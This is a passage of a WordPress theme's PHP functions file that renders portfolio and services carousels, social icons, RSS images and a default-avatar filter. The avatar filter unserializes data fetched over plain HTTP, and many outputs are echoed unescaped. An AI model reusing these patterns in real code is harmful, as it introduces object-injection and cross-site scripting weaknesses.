            </div><!-- /.container -->
        </div><!-- /.inner -->
    </div><!-- /.section -->
    <?php }
endif;


if (!function_exists('tfuse_show_works')) :
    function tfuse_show_works($cat_id,$title){ ?>
    <div id="<?php echo $title; ?>" <?php tfuse_page_bk_style($cat_id, 'category'); ?> class="section">
        <?php if( ($bg_color = tfuse_options('background_color','',$cat_id))!='') tfuse_menu_color_style($title, $bg_color);
        echo '<style>.myWork span.tag {color: '.$bg_color.'}</style>'; ?>
        <div class="inner" <?php tfuse_color_wrapper($cat_id,'category'); ?>>
            <?php if (tfuse_options('page_icon','',$cat_id)!=''){ ?>
            <div class="section-ico">
                <span class="color-bg" style="background:<?php echo tfuse_options('background_color','',$cat_id); ?>;"></span>
                <img src="<?php echo tfuse_options('page_icon','',$cat_id); ?>" alt=""/>
                <h5 class="mini-title" style="color:<?php echo tfuse_options('background_color','',$cat_id); ?>"><?php echo tfuse_options('icon_title','',$cat_id); ?></h5>
            </div>
            <?php } ?>
            <div class="container">
                <?php tfuse_custom_title($cat_id,'works'); ?>
                <!-- Carousel -->
                <div id="myWork<?php echo $cat_id; ?>" class="myWork carousel slide">
                    <div class="carousel-inner">
                        <?php
                        $args = array(
                            'post_type' => 'work',
                            'posts_per_page' => -1,
                            'tax_query' => array(
                                array(
                                    'taxonomy' => 'works',
                                    'field' => 'id',
                                    'terms' => $cat_id,
                                ),
                            )
                        );
                        $list_posts = new WP_Query($args);
                        $count_posts = 0;
                        foreach($list_posts->posts as $post){
                            $count_posts++;
                            $class = tfuse_page_options('content_position','img1',$post->ID); ?>
                            <div class="item <?php echo $class; if($count_posts==1)echo ' active'; ?>">
                                <?php tfuse_media($post->ID);
                                if(tfuse_page_options('work_type','image',$post->ID)=='video') $text_class = tfuse_page_options('video_position','pull-left',$post->ID);
                                else $text_class = tfuse_page_options('single_img_position','pull-left',$post->ID);
                                // change $text_class for slide-text
                                if($text_class == 'pull-left') $text_class = 'pull-right';
                                else $text_class = 'pull-left';
                                ?>
                                <div class="slide-text clearfix <?php echo $text_class; ?>">
                                    <h2 class="slide-title animate3" data-animate="bounceInDown"><a href="#"><?php echo $post->post_title; ?></a></h2>
                                    <p data-animate="fadeInRightBig" class="animate3"><?php echo apply_filters('themefuse_shortcodes', $post->post_content); ?></p>
                                    <?php $tags = get_the_terms( $post->ID, 'tags' );
                                    $count = 4;
                                    if(!empty($tags)){
                                        foreach($tags as $tag){ ?>
                                            <span class="tag animate<?php echo $count; ?>" data-animate="bounceInUp"><?php echo $tag->name; ?></span>
                                            <?php $count++;
                                        }
                                    } ?>
                                    <?php $live_url = tfuse_page_options('live_url','',$post->ID);
                                    if( $live_url != ''){ ?>
                                        <a target="_blank" href="<?php echo $live_url; ?>" class="button blue animate<?php echo $count; ?>" data-animate="bounceInUp"><span><?php echo tfuse_page_options('live_button','Live preview',$post->ID); ?></span></a>
                                        <?php } ?>
                                </div>
                                <?php if(($class == 'img1' || $class == 'img6' || $class == 'img5' || $class == 'img4') && tfuse_page_options('show_line',false,$post->ID) == true){
                                if($class == 'img4'){ ?>
                                    <img src="<?php echo get_template_directory_uri().'/'; ?>images/aslant-line1.png" alt="" class="oblique_image <?php echo $text_class; ?> aslant-line animate4 animate fadeIn" data-animate="fadeIn">
                                    <?php }
                                else{ ?>
                                    <img src="<?php echo get_template_directory_uri().'/'; ?>images/aslant-line1.png" alt="" class="oblique_image pull-right aslant-line animate4 animate fadeIn" data-animate="fadeIn">
                                    <?php }
                            } ?>
                            </div><!-- /.item -->
                            <?php } ?>
                    </div><!-- /.carousel-inner -->
                    <a class="left carousel-control" href="#myWork<?php echo $cat_id; ?>" data-slide="prev">
                        <span class="icon-prev"></span>
                    </a>
                    <a class="right carousel-control" href="#myWork<?php echo $cat_id; ?>" data-slide="next">
                        <span class="icon-next"></span>
                    </a>
                </div><!-- /.carousel slide-->
            </div><!-- /.container -->
        </div><!-- /.inner -->
    </div><!-- /.section -->
    <?php }
endif;


if (!function_exists('tfuse_show_services')) :
    function tfuse_show_services($cat_id,$title){ ?>
    <div id="<?php echo $title; ?>" <?php tfuse_page_bk_style($cat_id, 'category'); ?> class="section">
        <?php if( ($bg_color = tfuse_options('background_color','',$cat_id))!='') tfuse_menu_color_style($title, $bg_color); ?>
        <div class="inner" <?php tfuse_color_wrapper($cat_id,'category'); ?>>
            <?php if (tfuse_options('page_icon','',$cat_id)!=''){ ?>
            <div class="section-ico">
                <span class="color-bg" style="background:<?php echo tfuse_options('background_color','',$cat_id); ?>;"></span>
                <img src="<?php echo tfuse_options('page_icon','',$cat_id); ?>" alt=""/>
                <h5 class="mini-title" style="color:<?php echo tfuse_options('background_color','',$cat_id); ?>"><?php echo tfuse_options('icon_title','',$cat_id); ?></h5>
            </div>
            <?php } ?>
            <div class="container">
                <?php tfuse_custom_title($cat_id,'services'); ?>
                <!-- Carousel -->
                <div id="services-carousel<?php echo $cat_id; ?>" class="services-carousel  carousel slide" data-ride="carousel">
                    <!-- Wrapper for slides -->
                    <div class="carousel-inner">
                        <?php
                        $args = array(
                            'post_type' => 'service',
                            'posts_per_page' => -1,
                            'tax_query' => array(
                                array(
                                    'taxonomy' => 'services',
                                    'field' => 'id',
                                    'terms' => $cat_id,
                                ),
                            )
                        );
                        $list_posts = new WP_Query($args);
                        $count_posts = 0;

                        foreach($list_posts->posts as $post){
                            $count_posts++;
                            $img_lines = tfuse_page_options('enable_img_lines',true,$post->ID);
                            $service_type = tfuse_page_options('service_type','image',$post->ID);
                            if($service_type == 'video') $position = tfuse_page_options('video_position','',$post->ID);
                            else $position = tfuse_page_options('single_img_position','',$post->ID);
                            if($position=='pull-right'){
                                $left_class = ' pull-left';
                                $img_class = ' pull-right';
                            }
                            elseif($position=='pull-left'){
                                $left_class = ' pull-right';
                                $img_class = ' ';
                            }
                            else{
                                $left_class = '';
                                $img_class = '';
                            }
                            if(tfuse_page_options('content_right','',$post->ID) != '') $first_column = 'col-sm-3';
                            else $first_column = 'col-sm-7';
                            ?>
                            <div class="item <?php if($count_posts==1)echo 'active'; ?>">
                                <div class="row">
                                    <div class="<?php echo $first_column.' '; echo $left_class; ?>">
                                        <div class="widget-text">
                                            <?php $left_content = tfuse_page_options('content_left','',$post->ID);
                                            if($left_content != '') echo apply_filters('themefuse_shortcodes', $left_content); ?>
                                        </div>
                                    </div>

                                    <div class="col-sm-5 <?php echo $img_class; ?>">
                                        <div class="service-img">
                                            <?php if($service_type=='image' && $img_lines==true){ ?>
                                            <img src="<?php echo get_template_directory_uri().'/'; ?>images/aslanta-line3.png" alt="" class="aslant-line-left"/>
                                            <?php }
                                            tfuse_media($post->ID);
                                            if($service_type=='image' && $img_lines==true){ ?>
                                                <img src="<?php echo get_template_directory_uri().'/'; ?>images/aslanta-line3.png" alt="" class="aslant-line-right"/>
                                                <?php } ?>
                                        </div>
                                    </div>

                                    <div class="col-sm-4">
                                        <div class="widget-text">
                                            <?php $right_content = tfuse_page_options('content_right','',$post->ID);
                                            if($right_content != '') echo apply_filters('themefuse_shortcodes', $right_content); ?>
                                        </div>
                                    </div>

                                    <div class="clear"></div>
                                    <?php $btn_title = tfuse_page_options('button_title','',$post->ID);
                                    if($btn_title != ''){ ?>
                                        <div class="col-sm-12 carousel-footer">
                                            <a class="button green" href="<?php echo tfuse_page_options('button_url','',$post->ID); ?>"><span><?php echo $btn_title; ?></span></a>
                                        </div>
                                        <?php } ?>
                                </div><!-- /.row -->
                            </div><!-- /.item -->
                            <?php } ?>
                    </div><!-- /.carousel-inner -->
                    <!-- Controls -->
                    <a class="left carousel-control" href="#services-carousel<?php echo $cat_id; ?>" data-slide="prev"><span class="icon-prev"></span></a>
                    <a class="right carousel-control" href="#services-carousel<?php echo $cat_id; ?>" data-slide="next"><span class="icon-next"></span></a>
                </div><!-- /.carousel slide-->
            </div><!-- /.container -->
        </div><!-- /.inner -->
    </div><!-- /.section -->
    <?php }
endif;


if (!function_exists('tfuse_action_comments')) :
    /**
     *  This function disable post commetns.
     *
     * To override tfuse_action_comments() in a child theme, add your own tfuse_action_comments()
     * to your child theme's theme_config/theme_includes/THEME_FUNCTIONS.php file.
     */

    function tfuse_action_comments() {
        global $post;
        if (tfuse_page_options('enable_comments'))
            comments_template( '', true );
    }

    add_action('tfuse_comments', 'tfuse_action_comments');
endif;


//for image in rss
if(!function_exists('tfuse_feedFilter')) :
    function tfuse_feedFilter($query) {
        if ($query->is_feed) {
            add_filter('the_content', 'tfuse_feedContentFilter');
        }
        return $query;
    }
    add_filter('pre_get_posts','tfuse_feedFilter');

    function tfuse_feedContentFilter($content) {
        $thumb = tfuse_page_options('single_image');
        $image = '';
        if($thumb) {
            $image = '<a href="'.get_permalink().'"><img align="left" src="'. $thumb .'" width="200px" height="150px" /></a>';
            echo $image;
        }
        $content = $image . $content;
        return $content;
    }
endif;


if ( !function_exists('tfuse_footer_social')):
    function tfuse_footer_social(){
        if(tfuse_options('social_facebook','')!='') { ?>
        <a target="_blank" href="<?php echo tfuse_options('social_facebook'); ?>"><img src="<?php echo get_template_directory_uri() ;?>/images/icons/fb_ico.png" alt="facebook"/></a>
        <?php }
        if(tfuse_options('social_google','')!='') { ?>
        <a target="_blank" href="<?php echo tfuse_options('social_google'); ?>"><img src="<?php echo get_template_directory_uri(); ?>/images/icons/google_ico.png" alt="google plus"/></a>
        <?php }
        if(tfuse_options('social_twitter','')!='') { ?>
        <a target="_blank" href="<?php echo tfuse_options('social_twitter'); ?>"><img src="<?php echo get_template_directory_uri(); ?>/images/icons/tw_ico.png" alt="twitter"/></a>
        <?php }
        if(tfuse_options('social_email','')!='') { ?>
        <a target="" href="mailto:<?php echo tfuse_options('social_email'); ?>"><img src="<?php echo get_template_directory_uri(); ?>/images/icons/em_ico.png" alt="email"/></a>
        <?php }
        if(tfuse_options('social_dribble','')!='') { ?>
        <a target="_blank" href="<?php echo tfuse_options('social_dribble'); ?>"><img src="<?php echo get_template_directory_uri(); ?>/images/icons/dribble_ico.png" alt="dribble"/></a>
        <?php }
    }
endif;


if (!function_exists('tfuse_filter_get_avatar')){
    function tfuse_filter_get_avatar($avatar, $id_or_email, $size, $default, $alt){
        $avatar_src = tfuse_options('default_avatar', false);
        if(empty($avatar_src)) {
            return $avatar;
        }

        $email = '';
        if ( is_numeric($id_or_email) ) {
            $id = (int) $id_or_email;
            $user = get_userdata($id);
            if ( $user )
                $email = $user->user_email;
        } elseif ( is_object($id_or_email) ) {
            // No avatar for pingbacks or trackbacks
            $allowed_comment_types = apply_filters( 'get_avatar_comment_types', array( 'comment' ) );
            if ( ! empty( $id_or_email->comment_type ) && ! in_array( $id_or_email->comment_type, (array) $allowed_comment_types ) )
                return false;

            if ( !empty($id_or_email->user_id) ) {
                $id = (int) $id_or_email->user_id;
                $user = get_userdata($id);
                if ( $user)
                    $email = $user->user_email;
            } elseif ( !empty($id_or_email->comment_author_email) ) {
                $email = $id_or_email->comment_author_email;
            }
        } else {
            $email = $id_or_email;
        }

        if ( !empty($email) )
            $email_hash = md5( strtolower( trim( $email ) ) );
        else $email_hash = '';

        $url = 'http://gravatar.com/' . $email_hash . '.php';
        $result = unserialize(@file_get_contents($url));
        if(!is_array($result)){
            $avatar = "<img alt='' src='".TF_GET_IMAGE::get_src_link($avatar_src)."' class='avatar avatar-".$size." photo avatar-default' height='".$size."' width='".$size."' />";
        }
        return $avatar;
    }

    add_filter('get_avatar', 'tfuse_filter_get_avatar',10,5);
}


if (!function_exists('tfuse_hex2rgba')):
    function tfuse_hex2rgba($color, $opacity = false) {
        $default = 'rgb(0,0,0)';
        //Return default if no color provided
        if(empty($color))
            return $default;

        //Sanitize $color if "#" is provided
        if ($color[0] == '#' ) {
            $color = substr( $color, 1 );
        }

        //Check if color has 6 or 3 characters and get values
        if (strlen($color) == 6) {
            $hex = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] );
        } elseif ( strlen( $color ) == 3 ) {
            $hex = array( $color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2] );
        } else {
            return $default;
        }

        //Convert hexadec to rgb
        $rgb =  array_map('hexdec', $hex);

        //Check if opacity is set(rgba or rgb)
        if($opacity){
            if(abs($opacity) > 1)
                $opacity = 1.0;
            $output = 'rgba('.implode(",",$rgb).','.$opacity.')';
        } else {
            $output = 'rgb('.implode(",",$rgb).')';
        }

        //Return rgb(a) color string
        return $output;
    }
endif;

if(!function_exists('tfuse_update_reservation_forms'))
{
	function tfuse_update_reservation_forms()
	{
		$forms = get_terms( 'reservations', array(
			'orderby'    => 'count',
			'hide_empty' => 0
		) );

		$args = array(
			'0' =>  'text',
			'1' =>  'textarea',
			'2' =>  'radio',
			'3' =>  'checkbox',
			'4' =>  'select',
			'5' =>  'email',
			'6' =>  'captcha',
			'7' =>  'date_in',
			'8' =>  'date_out',
			'9' =>  'res_email',
		);

		foreach($forms as $form)
		{
			$check_option = get_option( 'tfuse_update_reservation_forms', 'none' );
			if($check_option == 'set')
			{
				return;
			}
			$description = unserialize($form->description);
			if(isset($description['version']) AND $description['version'] == '1.1')
				continue;

			foreach($description['input'] as $key => $input)
			{
				if(isset($args[$input['type']]))
					$input['type'] = $args[$input['type']];
				$description['input'][$key]['type'] = $input['type'];
			}
			$description['version'] = '1.1';
			wp_update_term($form->term_id, 'reservations', array('description' => serialize($description)));
			add_option('tfuse_update_reservation_forms', 'set');
		}
	}
	add_action('wp_head', 'tfuse_update_reservation_forms');
}